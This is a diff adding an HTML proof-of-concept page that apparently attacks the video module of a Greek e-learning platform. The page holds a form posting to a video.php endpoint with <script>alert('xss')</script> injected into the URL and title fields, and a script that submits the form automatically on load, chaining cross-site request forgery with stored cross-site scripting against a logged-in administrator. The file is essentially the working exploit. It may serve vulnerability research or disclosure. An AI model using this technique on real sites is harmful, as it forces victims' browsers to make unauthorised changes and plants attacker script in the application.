@@ -1,0 +1,46 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/video/video.php?submit=yes' method='post'>
+<table width="99%" class="FormData">
+    <tbody>
+    <tr>
+      <th class="left" width="220">&nbsp;</th>
+      <td><b>Προσθήκη συνδέσμου βίντεο</b></td>
+    </tr>
+    <tr>
+      <th class="left">Εξωτερικός σύνδεσμος προς τον εξυπηρετητή ήχου ή βίντεο
+      <input type="hidden" name="id" value="">
+      </th>
+      <td><input type="text" name="URL" value="<script>alert('xss')</script>" size="55" class="FormData_InputText"></td>
+    <tr>
+      <th class="left">Τίτλος βίντεο :</th>
+      <td><input type="text" name="titre" value="<script>alert('xss')</script>" size="55" class="FormData_InputText"></td>
+    </tr>
+    <tr>
+      <th class="left">Περιγραφή :</th>
+      <td><textarea wrap="physical" rows="3" name="description" cols="52" class="FormData_InputText"></textarea></td>
+    </tr>
+    <tr>
+      <th class="left">Δημιουργός :</th>
+      <td><input type="text" name="creator" value="Διαχειριστής Πλατφόρμας" size="55" class="FormData_InputText"></td>
+    </tr>
+    <tr>
+      <th class="left">Εκδότης :</th>
+      <td><input type="text" name="publisher" value="Διαχειριστής Πλατφόρμας" size="55" class="FormData_InputText"></td>
+    </tr>
+    <tr>
+      <th class="left">Ημερομηνία :</th>
+      <td><input type="text" name="date" value="2018-04-18 16:11" size="55" class="FormData_InputText"></td>
+    </tr>
+    <tr>
+      <th class="left">&nbsp;</th>
+      <td><input type="text" name="submit" value="Προσθήκη"></td>
+    </tr>
+    </tbody>
+    </table>
+
+
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
